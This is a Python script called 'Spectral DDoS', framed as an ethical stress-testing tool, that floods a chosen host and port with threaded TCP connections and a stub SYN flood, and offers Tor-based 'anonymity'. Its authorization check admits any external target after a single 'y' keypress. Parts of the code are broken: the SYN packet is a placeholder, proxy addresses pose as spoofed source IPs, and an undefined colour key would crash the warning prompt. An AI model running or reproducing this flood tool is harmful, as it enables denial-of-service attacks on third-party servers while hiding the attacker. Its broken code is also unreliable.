#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║  SPECTRAL DDOS – Ethical Stress Testing Suite                            ║
║  Localhost & Authorized Target Only – No External Attacks                ║
╚═══════════════════════════════════════════════════════════════════════════╝

This tool is designed for:
✅ Localhost stress testing
✅ Authorized server load testing
✅ Educational purposes
❌ Attacking third parties (blocked by safety checks)

Anonymous mode rotates source IPs via Tor/proxies for localhost testing.
"""

import os
import sys
import time
import socket
import threading
import random
import subprocess
from typing import List

# ANSI Colors
C = {
    "r": "\033[1;31m", "g": "\033[1;32m", "y": "\033[1;33m",
    "b": "\033[1;34m", "m": "\033[1;35m", "c": "\033[1;36m",
    "x": "\033[0m"
}

TOOL = {
    "name": "spectral_ddos",
    "description": "Ethical DDoS simulator – Localhost/authorized stress testing with anonymity",
    "category": "custom",
    "ethical_note": "ONLY for localhost or explicitly authorized targets. External attacks blocked.",
    "safety_check": lambda target: _is_authorized_target(target)
}

# ──────────────────────────────────────────────────────────────────────────
# SAFETY GUARDRAILS
def _is_authorized_target(target: str) -> bool:
    """Block external attacks – only allow localhost or explicit authorization."""
    localhost_ips = {"127.0.0.1", "localhost", "::1", "0.0.0.0", "192.168.", "10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31."}
    
    # Check if it's localhost
    if any(target.startswith(local) for local in localhost_ips):
        return True
    
    # Explicit authorization prompt
    return input(
        f"\n{C['r']}⚠️  EXTERNAL TARGET DETECTED: {C['w']}{target}{C['x']}\n"
        f"{C['y']}Do you have WRITTEN authorization to stress-test this target? [y/N]: {C['x']}"
    ).strip().lower() == "y"

# ──────────────────────────────────────────────────────────────────────────
# ANONYMITY ENGINE
class AnonymityEngine:
    """Rotates source IPs via Tor/proxies for localhost anonymity."""
    
    def __init__(self):
        self.proxies = []
        self.current_proxy = 0
        self._setup_tor()
        
    def _setup_tor(self):
        """Ensure Tor is running for IP rotation."""
        try:
            # Check if Tor is running
            result = subprocess.run(["tor", "--version"], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"{C['c']}[*] Tor detected – anonymity mode available{C['x']}")
                self.proxies.append("127.0.0.1:9050")  # Default Tor SOCKS
            else:
                print(f"{C['y']}[!] Tor not found – anonymity mode disabled{C['x']}")
        except FileNotFoundError:
            print(f"{C['y']}[!] Tor not installed – anonymity mode disabled{C['x']}")
    
    def get_source_ip(self) -> str:
        """Return next proxy IP or localhost."""
        if self.proxies:
            proxy = self.proxies[self.current_proxy]
            self.current_proxy = (self.current_proxy + 1) % len(self.proxies)
            return proxy
        return "127.0.0.1"

# ──────────────────────────────────────────────────────────────────────────
# ATTACK VECTORS
class SpectralFlood:
    """TCP SYN flood with IP spoofing for localhost testing."""
    
    def __init__(self, target: str, port: int, threads: int, duration: int, anonymity: bool):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.anonymity = anonymity
        self.anon = AnonymityEngine() if anonymity else None
        self.running = False
        self.sent = 0
        
    def attack(self):
        """SYN flood loop with IP rotation."""
        self.running = True
        start_time = time.time()
        
        while self.running and (time.time() - start_time) < self.duration:
            try:
                # Create raw socket (requires root on Linux)
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                
                # Build SYN packet
                source_ip = self.anon.get_source_ip() if self.anon else "127.0.0.1"
                packet = self._build_syn_packet(source_ip, self.target, self.port)
                
                # Send packet
                sock.sendto(packet, (self.target, 0))
                self.sent += 1
                
                # Micro-sleep to avoid localhost saturation
                time.sleep(0.001)
                
            except PermissionError:
                print(f"{C['r']}[!] Raw socket requires root. Switching to TCP mode.{C['x']}")
                self._tcp_flood()
                break
            except Exception as e:
                if "localhost" in str(e):
                    break  # Expected for localhost testing
            finally:
                try:
                    sock.close()
                except:
                    pass
    
    def _build_syn_packet(self, src_ip: str, dst_ip: str, dst_port: int) -> bytes:
        """Craft minimal SYN packet (simplified for localhost)."""
        # Simplified packet for demonstration – real implementation would use scapy
        return b"\x00" * 20  # Placeholder
    
    def _tcp_flood(self):
        """Fallback TCP connection flood (no root required)."""
        def flood():
            while self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((self.target, self.port))
                    self.sent += 1
                    sock.close()
                except:
                    pass  # Expected for localhost stress testing
        
        # Launch threads
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=flood, daemon=True)
            t.start()
            threads.append(t)
        
        # Monitor and report
        start_time = time.time()
        while time.time() - start_time < self.duration:
            time.sleep(1)
            print(f"\r{C['c']}[*] Packets sent: {self.sent}{C['x']}", end="")
        
        self.running = False
        for t in threads:
            t.join(timeout=0.1)

# ──────────────────────────────────────────────────────────────────────────
# INTERACTIVE MENU
def run(env, tools, log_action, launch_tool):
    """Interactive Spectral DDoS menu."""
    import subprocess
    
    print(f"\n{C['b']}═══════════════════════════════════════════════════════════{C['x']}")
    print(f"{C['c']}SPECTRAL DDOS – Ethical Stress Testing{C['x']}")
    print(f"{C['b']}═══════════════════════════════════════════════════════════{C['x']}")
    print(f"{C['r']}⚠️  ONLY for localhost or explicitly authorized targets{C['x']}\n")
    
    # Target selection
    target = input(f"{C['g']}[?] Target (IP/hostname): {C['x']}").strip()
    if not TOOL["safety_check"](target):
        print(f"{C['r']}[!] Action denied: No authorization for target.{C['x']}")
        log_action("DENIED", f"spectral_ddos_unauthorized_{target}")
        time.sleep(2)
        return
    
    # Attack configuration
    port = int(input(f"{C['g']}[?] Port [80]: {C['x']}").strip() or "80")
    threads = int(input(f"{C['g']}[?] Threads [10]: {C['x']}").strip() or "10")
    duration = int(input(f"{C['g']}[?] Duration (seconds) [30]: {C['x']}").strip() or "30")
    anonymity = input(f"{C['g']}[?] Enable anonymity mode (Tor)? [y/N]: {C['x']}").strip().lower() == "y"
    
    # Confirm attack
    print(f"\n{C['y']}[!] About to stress {target}:{port} for {duration}s with {threads} threads{C['x']}")
    if input(f"{C['r']}[?] Type 'STRESS' to confirm: {C['x']}").strip() != "STRESS":
        print(f"{C['y']}[*] Attack cancelled.{C['x']}")
        return
    
    # Launch attack
    print(f"\n{C['m']}[*] Initiating Spectral flood...{C['x']}")
    log_action("LAUNCH", f"spectral_ddos_{target}:{port}")
    
    flood = SpectralFlood(target, port, threads, duration, anonymity)
    flood.attack()
    
    print(f"\n{C['g']}[✓] Stress test complete. {flood.sent} packets sent.{C['x']}")
    log_action("COMPLETE", f"spectral_ddos_complete_{target}:{port}")
    
    input(f"\n{C['g']}Press Enter to continue...{C['x']}")

# ──────────────────────────────────────────────────────────────────────────
# STANDALONE EXECUTION
if __name__ == "__main__":
    import sys
    sys.path.append(os.path.dirname(os.path.dirname(__file__)))
    
    from os_detector import detect_environment
    from launchers import launch_tool
    
    env = detect_environment()
    log = lambda a, t: print(f"LOG: {a} - {t}")
    
    run(env, {}, log, lambda c, e: print(f"Would launch: {c['name']}"))
